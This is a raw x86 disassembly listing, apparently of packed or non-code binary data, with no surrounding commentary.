  424423:	ror    BYTE PTR [eax+0x7f],cl
  424426:	dec    ebp
  424427:	mov    ebp,0x6c8c02cb
  42442c:	mov    al,0xbb
  42442e:	sub    dh,bh
  424430:	int3   
  424431:	xchg   BYTE PTR [esi-0x22],al
  424434:	xchg   ebx,eax
  424435:	add    al,0x7c
  424437:	rcr    BYTE PTR [ebp-0x34fa3793],0x40
  42443e:	loop   0x424473
  424440:	ret    
  424441:	inc    eax
  424442:	inc    edi
  424443:	and    BYTE PTR [ebp+0x48],dh
  424446:	stos   DWORD PTR es:[edi],eax
  424447:	pushf  
  424448:	and    eax,0xec8f2473
  42444d:	fisttp WORD PTR [ecx-0x6f]
  424450:	popf   
  424451:	inc    edx
  424452:	add    DWORD PTR [edx+0x6899cc17],esp
  424458:	shr    BYTE PTR [ebp+0x47],1
  42445b:	out    0x36,eax
  42445d:	cmp    BYTE PTR [esi],ah
  42445f:	adc    esp,DWORD PTR [ebx]
  424461:	out    dx,eax
  424462:	adc    bh,BYTE PTR [ecx+0x6e]
  424465:	test   BYTE PTR [ebx+0x74],al
  424468:	dec    eax
  424469:	out    0x31,al
  42446b:	cwde   
  42446c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42446d:	outs   dx,DWORD PTR ds:[esi]
  42446e:	pop    eax
  42446f:	les    ebx,FWORD PTR [ebx+edi*8+0xa314f6e]
  424476:	cmp    esi,DWORD PTR [edx-0xe]
  424479:	ror    BYTE PTR [ebp+0x6056e254],cl
  42447f:	mov    bl,0xe0
  424481:	mov    ecx,0xb5e68bed
  424486:	cmp    dl,dl
  424488:	(bad)  
  424489:	out    0x71,al
  42448b:	inc    esi
  42448c:	mov    ds:0xb23708f5,eax
  424491:	cld    
  424492:	jg     0x4244f8
  424494:	xlat   BYTE PTR ds:[ebx]
  424495:	pop    esi
  424496:	outs   dx,DWORD PTR ds:[esi]
  424497:	xchg   ecx,eax
  424498:	jecxz  0x4244e4
  42449a:	mov    esp,0xfb039133
  42449f:	adc    al,0xb6
  4244a1:	out    0x2c,al
  4244a3:	(bad)  
  4244a4:	ja     0x4244db
  4244a6:	xor    al,0x95
  4244a8:	pop    ss
  4244a9:	add    DWORD PTR [ebp-0x569576cf],esi
  4244af:	mov    bh,0x63
  4244b1:	mov    ds:0x190beee3,eax
  4244b6:	aas    
  4244b7:	idiv   BYTE PTR es:0x4787926f
  4244be:	mov    dl,cl
  4244c0:	sub    BYTE PTR ds:0xd02faa23,dl
  4244c6:	aaa    
  4244c7:	(bad)  [ecx]
  4244c9:	pop    ds
  4244ca:	adc    eax,0x5c9e4b1b
  4244cf:	loopne 0x4244da
  4244d1:	push   ss
  4244d2:	(bad)  
  4244d3:	xchg   ebx,eax
  4244d4:	fwait
  4244d5:	stc    
  4244d6:	les    ecx,FWORD PTR [esi+0x62]
  4244d9:	pop    ebx
  4244da:	push   ds
  4244db:	fldz   
  4244dd:	stos   DWORD PTR es:[edi],eax
  4244de:	test   DWORD PTR [eax-0x47],ebp
  4244e1:	jmp    0x4244ec
  4244e3:	dec    edx
  4244e4:	push   eax
  4244e5:	lock or bh,dl
  4244e8:	pop    eax
  4244e9:	aas    
  4244ea:	cdq    
  4244eb:	pop    eax
  4244ec:	les    esi,FWORD PTR [ebx+0x72]
  4244ef:	ss leave 
  4244f1:	dec    ecx
  4244f2:	jnp    0x424541
  4244f4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4244f5:	lds    esi,FWORD PTR [ebx-0x4d]
  4244f8:	push   eax
  4244f9:	xchg   ebx,eax
  4244fa:	inc    ecx
  4244fb:	fdiv   st,st(0)
  4244fd:	inc    ebp
  4244fe:	hlt    
  4244ff:	sub    edi,0x37
  424502:	mov    esi,0x5442064e
  424507:	js     0x4244e4
  424509:	(bad)  
  42450a:	cmp    DWORD PTR [edi+0x2bc10990],ecx
  424510:	dec    edx
  424511:	pop    esp
  424512:	cld    
  424513:	mov    edi,0x6b6a2fa
  424518:	fld    DWORD PTR [esi-0x77]
  42451b:	(bad)  
  42451c:	imul   ebp,DWORD PTR [eax+0x6fbb3ceb],0xffffff81
  424523:	pusha  
  424524:	call   0x8b64:0xfaeb46b5
  42452b:	add    BYTE PTR [ebp+ecx*1-0x11263e32],bl
  424532:	inc    eax
  424533:	adc    al,BYTE PTR [esi+0x52d1222e]
  424539:	repz lahf 
  42453b:	pusha  
  42453c:	sbb    ebp,ebx
  42453e:	xchg   esp,eax
  42453f:	or     eax,0x15518b56
  424544:	or     al,0xb
  424546:	push   0xbef48a67
  42454b:	xor    BYTE PTR [ecx],dh
  42454d:	imul   eax,DWORD PTR [edi+edi*1-0x32a2ff05],0xecef9c26
  424558:	psubsb mm2,QWORD PTR [eax]
  42455b:	(bad)  
  42455c:	and    eax,0xc720dd24
  424561:	push   0x34aca200
  424566:	pop    ecx
  424567:	push   0x4
  424569:	sub    al,0xe6
  42456b:	push   es
  42456c:	pop    ebx
  42456d:	sub    al,0xd2
  42456f:	xor    eax,0x8615cb10
  424574:	lods   al,BYTE PTR ds:[esi]
  424575:	es inc edx
  424577:	not    BYTE PTR [ecx-0x1b33dad3]
  42457d:	scas   al,BYTE PTR es:[edi]
  42457e:	lods   eax,DWORD PTR ds:[esi]
  42457f:	inc    ebp
  424580:	push   ss
  424581:	repz sub BYTE PTR [ecx+0x75],al
  424585:	and    bh,BYTE PTR ss:[eax+0x25415f8]
  42458c:	cwde   
  42458d:	js     0x42456f
  42458f:	imul   esi,DWORD PTR [eax],0xee1870ab
  424595:	adc    al,0x55
  424597:	dec    ebp
  424598:	mov    esp,0xc9fb0b63
  42459d:	dec    esp
  42459e:	cld    
  42459f:	mov    ch,0xd5
  4245a1:	add    edi,edx
  4245a3:	dec    esp
  4245a4:	out    dx,eax
  4245a5:	ins    DWORD PTR es:[edi],dx
  4245a6:	call   0xb430:0x9d893ef9
  4245ad:	loop   0x424627
  4245af:	xor    edi,edi
  4245b1:	cmp    eax,0x59e8fc15
  4245b6:	lahf   
  4245b7:	sub    al,BYTE PTR [ebx]
  4245b9:	dec    esp
  4245ba:	xor    ebx,esi
  4245bc:	nop
  4245bd:	ret    
  4245be:	add    DWORD PTR [edi],edx
  4245c0:	cli    
  4245c1:	sti    
  4245c2:	mov    bl,0x7d
  4245c4:	icebp  
  4245c5:	jbe    0x424590
  4245c7:	xor    al,0x9a
  4245c9:	outs   dx,BYTE PTR ds:[esi]
  4245ca:	adc    esi,esp
  4245cc:	xchg   esp,eax
  4245cd:	repz lea ebp,[ebx-0x58]
  4245d1:	xchg   ebp,eax
  4245d2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4245d3:	loop   0x424567
  4245d5:	cli    
  4245d6:	fwait
  4245d7:	xlat   BYTE PTR ds:[ebx]
  4245d8:	loope  0x424578
  4245da:	and    DWORD PTR [ecx-0x24bda4e9],ebp
  4245e0:	jno    0x4245c5
  4245e2:	xchg   ebp,eax
  4245e3:	in     eax,dx
  4245e4:	retf   0x5e46
  4245e7:	les    eax,FWORD PTR [ecx+0x7f886c85]
  4245ed:	dec    esp
  4245ee:	inc    edx
  4245ef:	xchg   BYTE PTR [esp+ebx*4],dl
  4245f2:	dec    ebp
  4245f3:	(bad)  
  4245f5:	pop    edi
  4245f6:	out    dx,eax
  4245f7:	cmp    al,0xbc
  4245f9:	mov    ecx,0xdd427560
  4245fe:	lods   eax,DWORD PTR ds:[esi]
  4245ff:	mov    esi,0xca7e2f95
  424604:	in     al,0xf3
  424606:	shr    DWORD PTR [ecx*8-0x64bd04f3],1
  42460d:	xor    eax,0x35f4cf8d
  424612:	sbb    bh,al
  424614:	scas   al,BYTE PTR es:[di]
  424616:	je     0x42462d
  424618:	daa    
  424619:	pop    es
  42461a:	pop    edx
  42461b:	and    BYTE PTR [eax+eax*2],0xab
  42461f:	mov    dh,0x55
  424621:	xchg   ebx,eax
  424623:	mov    es:0x80639261,eax
  424629:	aaa    
  42462a:	retf   
  42462b:	and    DWORD PTR [eax+0x130273c7],edi
  424631:	fcomp  QWORD PTR [edi+esi*2+0x47]
  424635:	jge    0x4245d1
  424637:	xchg   DWORD PTR [edi+0x40],eax
  42463a:	sub    al,0x85
  42463c:	mov    dh,0xa3
  42463e:	mov    al,0x8f
  424640:	push   ebx
  424641:	int3   
  424642:	or     ecx,DWORD PTR [ebp+ebp*2-0xb]
  424646:	xchg   eax,edi
  424648:	aaa    
  424649:	test   bh,dh
  42464b:	mov    edx,0xecb62ad3
  424650:	ja     0x424611
  424652:	mov    edi,0x1d6c881e
  424657:	js     0x424668
  424659:	sbb    al,0xdd
  42465b:	js     0x42460d
  42465d:	pop    ecx
  42465f:	pop    eax
  424660:	mov    BYTE PTR [esi],bh
  424662:	popf   
  424663:	add    eax,0xe0fad1f3
  424668:	vpavgb ymm5,ymm0,YMMWORD PTR [eax+ecx*4-0x46]
  42466e:	aaa    
  42466f:	mov    DWORD PTR [edx-0x2ff50d37],edi
  424675:	inc    edi
  424676:	ins    BYTE PTR es:[edi],dx
  424677:	pusha  
  424678:	mov    ch,0xb9
  42467a:	mov    dl,0x52
  42467c:	cs mov dl,0x79
  42467f:	dec    esp
  424680:	mov    edi,0x4751b2e4
  424685:	aad    0x2f
  424687:	mov    eax,0x218a2f38
  42468c:	adc    ch,BYTE PTR [ecx-0x5c9b1c8b]
  424692:	cmc    
  424693:	retf   
  424694:	pop    edi
  424695:	leave  
  424696:	scas   eax,DWORD PTR es:[edi]
  424697:	or     al,0x4b
  424699:	sti    
  42469a:	jbe    0x42463b
  42469c:	sub    DWORD PTR [edi],ecx
  42469e:	ds fwait
  4246a0:	push   cs
  4246a1:	lock fcompp 
  4246a4:	add    edi,esp
  4246a6:	and    BYTE PTR [ebp-0x4f5d58af],al
  4246ac:	jmp    0x4246ea
  4246ae:	cmp    ebx,DWORD PTR [ebx+ebx*2-0x79]
  4246b2:	xchg   esi,eax
  4246b3:	xor    esi,edx
  4246b5:	cmp    DWORD PTR [esi+0x102b4dfc],edx
  4246bb:	or     ecx,ebx
  4246bd:	pop    esi
  4246be:	mov    edi,0xf3a08849
  4246c3:	fdivr  DWORD PTR [ebp-0x8]
  4246c6:	js     0x424733
  4246c8:	mov    ebx,0x24ad9224
  4246cd:	dec    eax
  4246ce:	arpl   bp,di
  4246d0:	pop    ds
  4246d1:	or     al,0xf9
  4246d3:	adc    ecx,DWORD PTR [ebp-0x56]
  4246d6:	jbe    0x4246ba
  4246d8:	pop    ebx
  4246d9:	inc    edi
  4246da:	std    
  4246db:	jne    0x424673
  4246dd:	enter  0x917e,0x44
  4246e1:	jp     0x4246d8
  4246e3:	push   ecx
  4246e4:	retf   
  4246e5:	test   DWORD PTR [ebp+ebp*2-0x26],esp
  4246e9:	stc    
  4246ea:	xchg   ebx,eax
  4246eb:	shl    al,0xc6
  4246ee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4246ef:	ins    DWORD PTR es:[edi],dx
  4246f0:	pop    esi
  4246f1:	in     eax,0x50
  4246f3:	ss adc al,0x4b
  4246f6:	int3   
  4246f7:	aas    
  4246f8:	mov    ?,edx
  4246fa:	add    DWORD PTR fs:[esi],edi
  4246fd:	int3   
  4246fe:	dec    ecx
  4246ff:	call   0xf7b2:0x5e8d737c
  424706:	loopne 0x42473d
  424708:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424709:	(bad)  
  42470a:	pusha  
  42470b:	inc    edx
  42470c:	mov    bl,0xdc
  42470e:	jae    0x42475a
  424710:	out    0x7f,eax
  424712:	xchg   BYTE PTR [edx],dl
  424714:	add    BYTE PTR [ecx-0x9fad20c],cl
  42471a:	lods   al,BYTE PTR ds:[esi]
  42471b:	mov    edi,0xff5b4170
  424720:	in     eax,0x5e
  424722:	out    dx,eax
  424723:	(bad)  
  424725:	repz sti 
  424727:	adc    dh,dh
  424729:	push   esi
  42472a:	cli    
  42472b:	into   
  42472c:	dec    ebx
  42472d:	ret    0x485a
  424730:	add    al,0x8f
  424732:	adc    BYTE PTR [ebx],dl
  424734:	sbb    dl,al
  424736:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424737:	sbb    al,0x6b
  424739:	fbstp  TBYTE PTR [ebx]
  42473b:	pop    ds
  42473c:	cli    
  42473d:	cmp    edi,ebx
  42473f:	mov    eax,ds:0x529db135
  424744:	sub    eax,0xf1d25a8f
  424749:	mov    esi,0x6b819978
  42474e:	ret    
  42474f:	ror    DWORD PTR ds:0x3a1c7974,0xfa
  424756:	inc    ebx
  424757:	or     al,0xf4
  424759:	nop
  42475a:	jmp    0x4246e1
  42475c:	pop    ss
  42475d:	or     BYTE PTR ds:0xb1e92641,bl
  424763:	in     al,0x61
  424765:	mov    dl,0x6c
  424767:	data16 outs dx,BYTE PTR ds:[esi]
  424769:	loop   0x4246f6
  42476b:	sub    esi,esi
  42476d:	rcr    DWORD PTR [edx-0x514c6132],cl
  424773:	mov    esi,0x6ace7046
  424778:	pop    es
  424779:	lods   al,BYTE PTR ds:[esi]
  42477a:	sbb    al,0xa5
  42477c:	es gs in eax,0x96
  424780:	sahf   
  424781:	sub    bl,dh
  424783:	and    ebx,DWORD PTR [ecx-0x5]
  424786:	sbb    al,0xd8
  424788:	xchg   ebx,eax
  424789:	sbb    eax,0xf2a300a9
  42478e:	imul   DWORD PTR ds:[di+0x4f]
  424793:	pop    esi
  424794:	rol    DWORD PTR [edx+0x2acf521],0x76
  42479b:	sub    eax,0x1881331
  4247a0:	mov    BYTE PTR [esi],ch
  4247a2:	retf   
  4247a3:	dec    eax
  4247a4:	dec    ecx
  4247a5:	add    BYTE PTR [eax-0x38],al
  4247a8:	or     DWORD PTR [ebx],ebx
  4247aa:	out    dx,eax
  4247ab:	xchg   edx,eax
  4247ac:	add    dl,BYTE PTR [eax]
  4247ae:	adc    edi,DWORD PTR [ebx]
  4247b0:	push   0xfffffffd
  4247b2:	test   DWORD PTR [edi],ecx
  4247b4:	xchg   ebp,eax
  4247b5:	jnp    0x424774
  4247b7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4247b8:	jl     0x4247aa
  4247ba:	(bad)
  4247bd:	popf   
  4247be:	ins    BYTE PTR es:[edi],dx
  4247bf:	iret   
  4247c0:	push   eax
  4247c1:	sbb    edx,DWORD PTR [edi]
  4247c3:	stos   BYTE PTR es:[edi],al
  4247c4:	pop    edi
  4247c5:	xor    BYTE PTR [edi-0x39],0xb2
  4247c9:	push   edx
  4247ca:	push   ds
  4247cb:	add    al,0xc4
  4247cd:	test   BYTE PTR [ebx-0x4f],al
  4247d0:	mul    DWORD PTR [edi-0x694813fc]
  4247d6:	cmp    bh,BYTE PTR [ecx*2+0x378806ab]
  4247dd:	icebp  
  4247de:	mov    ds:0xb2b35151,al
  4247e3:	sahf   
  4247e4:	(bad)  
  4247e5:	mov    al,ds:0x122f9bf0
  4247ea:	das    
  4247eb:	add    eax,0x133abc4b
  4247f0:	jae    0x42481f
  4247f2:	lods   eax,DWORD PTR ds:[esi]
  4247f3:	iret   
  4247f4:	in     eax,dx
  4247f5:	(bad)  
  4247f6:	stc    
  4247f7:	push   ebx
  4247f8:	clc    
  4247f9:	cwde   
  4247fa:	xor    ecx,edx
  4247fc:	pop    esi
  4247fd:	stc    
  4247fe:	xchg   ecx,eax
  4247ff:	mov    eax,0x718dd627
  424804:	das    
  424805:	push   bx
  424807:	outs   dx,DWORD PTR ds:[esi]
  424808:	mov    edx,0x7be9a896
  42480d:	xchg   edi,eax
  42480e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42480f:	enter  0x46ab,0x56
  424813:	sbb    al,dh
  424815:	cmp    edx,DWORD PTR [edi+ebx*4+0x4a]
  424819:	fidiv  DWORD PTR [edi]
  42481b:	jge    0x424817
  42481d:	sbb    bh,BYTE PTR [ebp-0xb]
  424820:	pop    ds
  424821:	xchg   ebp,eax
  424822:	mov    eax,ds:0xa8038b06
  424827:	pop    esi
  424828:	push   0xa76a3e4a
  42482d:	fimul  DWORD PTR [ecx-0x4]
  424830:	cli    
  424831:	adc    eax,0xe982304c
  424836:	jp     0x4247fc
  424838:	ins    DWORD PTR es:[edi],dx
  424839:	xlat   BYTE PTR ds:[ebx]
  42483a:	or     BYTE PTR [ecx],dh
  42483c:	sbb    DWORD PTR [edi],ecx
  42483e:	fmul   st,st(0)
  424840:	mov    ecx,0x5dc19495
  424845:	pop    ss
  424846:	pop    ecx
  424847:	add    cl,BYTE PTR [ecx]
  424849:	push   edi
  42484a:	shr    eax,1
  42484c:	push   es
  42484d:	add    DWORD PTR [edi-0x3f],ebp
  424850:	xchg   ecx,eax
  424851:	jae    0x424868
  424853:	cmp    eax,0x8b7d216c
  424858:	pop    ebx
  424859:	jp     0x42486b
  42485b:	inc    ebx
  42485c:	mov    ebx,eax
  42485e:	mov    cl,0x6b
  424860:	cdq    
  424861:	pushf  
  424862:	adc    eax,0xaeb7072e
  424867:	aaa    
  424868:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424869:	jle    0x4248b3
  42486b:	inc    ecx
  42486c:	and    BYTE PTR ds:0x653f3c4e,al
  424872:	inc    eax
  424873:	sub    ch,BYTE PTR [edx+eiz*1]
  424876:	aad    0x1
  424878:	scas   eax,DWORD PTR es:[edi]
  424879:	gs loopne 0x4248e1
  42487c:	push   es
  42487d:	sub    cl,BYTE PTR [ecx-0xf3ef9de]
  424883:	(bad)  
  424884:	xchg   edi,eax
  424885:	sbb    al,bh
  424887:	dec    edx
  424888:	dec    eax
  424889:	add    ecx,ebp
  42488b:	jo     0x424816
  42488d:	and    eax,0xab2bb9d5
  424892:	stc    
  424893:	push   0x2cc471ff
  424898:	cmp    al,0xa7
  42489a:	or     DWORD PTR [edi+0x115d5950],0xddc0bf88
  4248a4:	mov    eax,0xdfa8b0a3
  4248a9:	cwde   
  4248aa:	mov    edi,0x48dfe04e
  4248af:	fsub   DWORD PTR [esi]
  4248b1:	sbb    cl,BYTE PTR [edi]
  4248b3:	js     0x4248ae
  4248b5:	les    esi,FWORD PTR [eax+0x31]
  4248b8:	hlt    
  4248b9:	and    dh,BYTE PTR [eax+0xa0aafa4]
  4248bf:	and    BYTE PTR [ebp+0x4c],ch
  4248c2:	or     al,0xc1
  4248c4:	jecxz  0x42486a
  4248c6:	pop    edi
  4248c7:	cwde   
  4248c8:	in     al,dx
  4248c9:	push   cs
  4248ca:	adc    ecx,DWORD PTR [ebp+esi*1+0x27]
  4248ce:	cmp    esp,ecx
  4248d0:	jnp    0x424874
  4248d2:	cwde   
  4248d3:	sbb    ah,BYTE PTR [ebp+0x39641ca0]
  4248d9:	cmp    edi,DWORD PTR [ecx+0x3b]
  4248dc:	test   DWORD PTR [ebx-0x219e8ef],ebp
  4248e2:	dec    edi
  4248e3:	adc    al,0xb0
  4248e5:	aam    0x49
  4248e7:	(bad)  [ecx-0x38cae8ed]
  4248ed:	or     al,0x7c
  4248ef:	imul   ebx,DWORD PTR [edx],0x8025c18a
  4248f5:	idiv   DWORD PTR [esi]
  4248f7:	inc    edx
  4248f8:	cdq    
  4248f9:	mov    ebp,0x5827ae7a
  4248fe:	test   BYTE PTR [ecx+0x46aff732],ah
  424904:	add    esp,DWORD PTR [edx+0x5a80de1d]
  42490a:	sub    BYTE PTR [esi],ah
  42490c:	sar    DWORD PTR [ecx-0x18e4ce8e],1
  424912:	cmp    bh,dl
  424914:	sub    DWORD PTR [ecx-0x5e],ebx
  424917:	push   ss
  424918:	sub    al,0x67
  42491a:	mov    ds:0xa5c212a3,eax
  42491f:	test   BYTE PTR [ebp-0x41d567c4],ah
  424925:	sti    
  424926:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424927:	out    0xc7,al
  424929:	loope  0x4248ce
  42492b:	mov    ecx,DWORD PTR [edi]
  42492d:	mov    bh,0x9a
  42492f:	shl    DWORD PTR [ecx-0x7f],0xc3
  424933:	dec    ebp
  424934:	add    al,BYTE PTR [ecx]
  424936:	aad    0x62
  424938:	and    eax,0x77549f52
  42493d:	shl    ebp,1
  42493f:	push   edi
  424940:	sahf   
  424941:	add    ecx,DWORD PTR [ecx-0x34]
  424944:	jmp    FWORD PTR [esi-0x27]
  424947:	je     0x4248d0
  424949:	jo     0x4249a1
  42494b:	std    
  42494c:	adc    eax,0x768d307a
  424951:	sub    ah,BYTE PTR [ecx+ebp*4]
  424954:	cmp    eax,0xa843376a
  424959:	pop    eax
  42495a:	arpl   WORD PTR [ecx+0x32],sp
  42495d:	dec    ecx
  42495e:	rol    DWORD PTR [esi+0x742957f8],cl
  424964:	loope  0x424901
  424966:	fwait
  424967:	xor    BYTE PTR ds:[edi],ch
  42496a:	add    bh,al
  42496c:	adc    edi,DWORD PTR [edi-0x3ff82b0f]
  424972:	call   FWORD PTR [edx-0x43c96585]
  424978:	add    ch,dh
  42497a:	icebp  
  42497b:	inc    ecx
  42497c:	shl    BYTE PTR [edx],1
  42497e:	mov    bh,0xc7
  424980:	es popf 
  424982:	or     esi,ebp
  424984:	inc    eax
  424985:	mov    DWORD PTR [esp],0x41884727
  42498c:	adc    eax,ebp
  42498e:	enter  0x80b3,0x36
  424992:	mov    esp,DWORD PTR [edx-0x13]
  424995:	jmp    0xc38f:0x69591d50
  42499c:	sar    BYTE PTR [esi],0xb4
  42499f:	xchg   edx,eax
  4249a0:	stos   BYTE PTR es:[edi],al
  4249a1:	jbe    0x42497e
  4249a3:	xchg   ecx,eax
  4249a4:	or     ah,BYTE PTR [edx-0x1f]
  4249a7:	and    DWORD PTR [esi],esi
  4249a9:	shl    DWORD PTR [ecx+0x4d],0x23
  4249ad:	in     al,dx
  4249ae:	sub    ah,BYTE PTR [ebp-0xf]
  4249b1:	or     BYTE PTR [ebx],bl
  4249b3:	push   0x7a
  4249b5:	lea    eax,ds:0x6f8a828c
  4249bb:	xor    BYTE PTR ds:[edx],dh
  4249be:	push   ds
  4249bf:	pop    eax
  4249c0:	mov    WORD PTR [ebx],?
  4249c2:	fwait
  4249c3:	retf   0x8198
  4249c6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4249c7:	loopne 0x42495f
  4249c9:	dec    esp
  4249ca:	mov    bh,0x21
  4249cc:	cmp    ebx,DWORD PTR [edi+edi*4]
  4249cf:	mov    ds:0x23bf8a69,eax
  4249d4:	cld    
  4249d5:	adc    BYTE PTR [ecx-0x6c4ba918],cl
  4249db:	inc    eax
  4249dc:	pusha  
  4249dd:	or     al,0x80
  4249df:	les    eax,FWORD PTR [ebx]
  4249e1:	jb     0x424a58
  4249e3:	and    ebp,DWORD PTR [ecx-0x11d7e6c1]
  4249e9:	sub    ch,bh
  4249eb:	(bad)  
  4249ec:	int    0x7f
  4249ee:	jne    0x4249f4
  4249f0:	and    BYTE PTR [edx],cl
  4249f2:	sbb    DWORD PTR [ebp+0x35],edx
  4249f5:	ret    
  4249f6:	xlat   BYTE PTR ds:[ebx]
  4249f7:	in     eax,0x8f
  4249f9:	pop    edx
  4249fa:	daa    
  4249fb:	fimul  WORD PTR [eax+0x3e]
  4249fe:	xchg   BYTE PTR [eax+0x3fed874c],al
  424a04:	push   ecx
  424a05:	xchg   esp,eax
  424a06:	or     dl,ch
  424a08:	and    eax,0x402cb9f1
  424a0d:	mov    ebp,0xfd9ef46b
  424a12:	das    
  424a13:	mov    bh,0x42
  424a15:	dec    esi
  424a16:	adc    DWORD PTR [eax-0x7e],0xffffffba
  424a1a:	mov    ds:0xd12ddb85,al
  424a1f:	in     al,0x88
  424a21:	shl    BYTE PTR [ebx],cl
  424a23:	js     0x424a94
  424a25:	lahf   
  424a26:	mov    ch,0xe0
  424a28:	pop    esi
  424a29:	xor    DWORD PTR [ebp-0x78c33e4],edx
  424a2f:	add    BYTE PTR [ebp-0x3],0x5e
  424a33:	cmp    al,0x30
  424a35:	sub    ah,ah
  424a37:	adc    ah,BYTE PTR [eax+0x57678b26]
  424a3d:	xchg   esi,eax
  424a3e:	xor    DWORD PTR [eax+0x7cf289db],eax
  424a44:	xor    ebx,edi
  424a46:	addr16 retf 0xcefa
  424a4a:	add    edi,edx
  424a4c:	sbb    ebp,DWORD PTR [edi-0x33]
  424a4f:	pushf  
  424a50:	cmp    ecx,DWORD PTR [ebx]
  424a52:	fisub  WORD PTR [ebx+0x5edceecc]
  424a58:	and    bl,dl
  424a5a:	sub    dl,bh
  424a5c:	push   edx
  424a5d:	mov    dh,0x37
  424a5f:	sbb    eax,0x1ef6
  424a64:	add    BYTE PTR [eax],al
  424a66:	add    BYTE PTR [eax],al
  424a68:	add    BYTE PTR [eax],al
  424a6a:	push   edx
  424a6b:	inc    ecx
  424a6c:	push   esp
  424a6d:	push   edx
  424a6e:	push   edi
  424a6f:	push   edi
  424a70:	push   esi
  424a71:	inc    ecx
  424a72:	ror    DWORD PTR [ebx-0x49],1
  424a75:	popf   
  424a76:	and    bh,al
  424a78:	les    esp,FWORD PTR [eax+edx*2]
  424a7b:	fadd   DWORD PTR [ecx]
  424a7d:	add    BYTE PTR [eax-0x2fffffa],al
  424a83:	pop    esp
  424a84:	lods   eax,DWORD PTR ds:[esi]
  424a85:	test   BYTE PTR [ecx],al
  424a87:	adc    DWORD PTR [esp+esi*4+0x7fcc19c2],0xffffffad
  424a8f:	push   ebx
  424a90:	sub    BYTE PTR [eax+0x3f],ch
  424a93:	ja     0x424a8d
  424a95:	nop
  424a96:	adc    bh,BYTE PTR [edx]
  424a98:	mov    ds:0xfd5109ea,eax
  424a9d:	mov    edi,0x2dd0ada7
  424aa2:	pop    ss
  424aa3:	mov    eax,ds:0xb2b48a5b
  424aa8:	sub    cl,BYTE PTR [edx+0x2189e3bd]
  424aae:	adc    BYTE PTR [esi-0x16],al
  424ab1:	js     0x424a7c
  424ab3:	push   esi
  424ab4:	jp     0x424a8a
  424ab6:	out    0xf8,eax
  424ab8:	mov    bh,0xb9
  424aba:	sbb    BYTE PTR [edx+0x3137a8e3],ah
  424ac0:	inc    eax
  424ac1:	or     eax,0xd2583f26
  424ac6:	xor    BYTE PTR [ebp-0x6e91c003],0x31
  424acd:	cmp    ebp,edi
  424acf:	or     DWORD PTR [edi+0x5b],edx
  424ad2:	jae    0x424b2c
  424ad4:	mov    dh,0x1c
  424ad6:	cmp    BYTE PTR [esi+esi*8-0x3d10f2de],0x80
  424ade:	loope  0x424a96
  424ae0:	cli    
  424ae1:	daa    
  424ae2:	aaa    
  424ae3:	fcmovne st,st(0)
  424ae5:	cli    
  424ae6:	xor    esp,DWORD PTR [edx]
  424ae8:	repz cmp cl,BYTE PTR [ebx+ecx*4+0x49c4a829]
  424af0:	loopne 0x424b52
  424af2:	dec    ebp
  424af3:	pop    edx
  424af4:	cmp    DWORD PTR [esi+0xb34801a],edx
  424afa:	cld    
  424afb:	pop    ds
  424afc:	sti    
  424afd:	scas   eax,DWORD PTR es:[edi]
  424afe:	call   0xffe3:0xada23993
  424b05:	fimul  DWORD PTR [ecx-0x3]
  424b08:	sub    ecx,0x3a
  424b0b:	mov    ch,0x54
  424b0d:	mov    ebx,0xf796571f
  424b12:	fiadd  DWORD PTR [eax+0x53]
  424b15:	sub    DWORD PTR [ebp-0x1793e55b],ebx
  424b1b:	push   edi
  424b1c:	xchg   esi,eax
  424b1d:	push   0x43
  424b1f:	call   0xe0fa93d7
  424b24:	pop    ebp
  424b25:	pusha  
  424b26:	mov    bl,0xf5
  424b28:	(bad)  
  424b2a:	inc    ecx
  424b2b:	(bad)  
  424b2c:	(bad)  
  424b2d:	std    
  424b2e:	das    
  424b2f:	dec    edi
  424b30:	aas    
  424b31:	jae    0x424b02
  424b33:	mov    DWORD PTR [ebx+edx*8],eax
  424b36:	mov    eax,ds:0x9a75064b
  424b3b:	popa   
  424b3c:	ret    
  424b3d:	adc    edi,DWORD PTR [edi+eiz*1-0x21]
  424b41:	in     eax,0x5e
  424b43:	cmp    BYTE PTR [eax],dh
  424b45:	mov    ds:0xe0bed8cb,eax
  424b4a:	and    al,0x91
  424b4c:	fcom   QWORD PTR [eax+0x31]
  424b4f:	out    0x89,eax
  424b51:	xchg   ebp,eax
  424b52:	cdq    
  424b53:	push   edi
  424b54:	add    al,0x24
  424b56:	imul   edx,DWORD PTR [ebp-0x31],0x60a9848a
  424b5d:	(bad)
  424b60:	push   ds
  424b61:	dec    esp
  424b62:	popf   
  424b63:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424b64:	inc    edx
  424b65:	test   al,0xe7
  424b67:	das    
  424b68:	xchg   esi,eax
  424b69:	dec    ecx
  424b6a:	(bad)  
  424b6c:	call   0x5866:0x6f08f2d4
  424b73:	lods   al,BYTE PTR ds:[esi]
  424b74:	fmul   st(5),st
  424b76:	ds fs (bad) 
  424b7a:	test   al,0x52
  424b7c:	rcl    ah,1
  424b7e:	mov    al,ds:0x7c188a39
  424b83:	lds    ecx,FWORD PTR [eax+0x7d8e4132]
  424b89:	sbb    ebx,DWORD PTR [esi+eiz*2+0x5f9b1cb3]
  424b90:	dec    ecx
  424b91:	jne    0x424c00
  424b93:	(bad)  
  424b94:	inc    esp
  424b95:	call   0xd6b:0x726539e7
  424b9c:	into   
  424b9d:	push   esp
  424b9e:	sbb    ch,BYTE PTR [ecx]
  424ba0:	and    BYTE PTR ss:[eax],0x75
  424ba4:	mov    ch,BYTE PTR [eax+0x3a]
  424ba7:	cmp    DWORD PTR [ebx],0xffffffe0
  424baa:	cld    
  424bab:	jmp    0x6a38:0x8029fa21
  424bb2:	jmp    0x424b70
  424bb4:	sbb    al,0x7b
  424bb6:	call   0x680a2c9e
  424bbb:	mov    al,0x1a
  424bbd:	enter  0xc25,0x58
  424bc1:	xor    DWORD PTR ds:0x828f0338,ebp
  424bc7:	pop    ebp
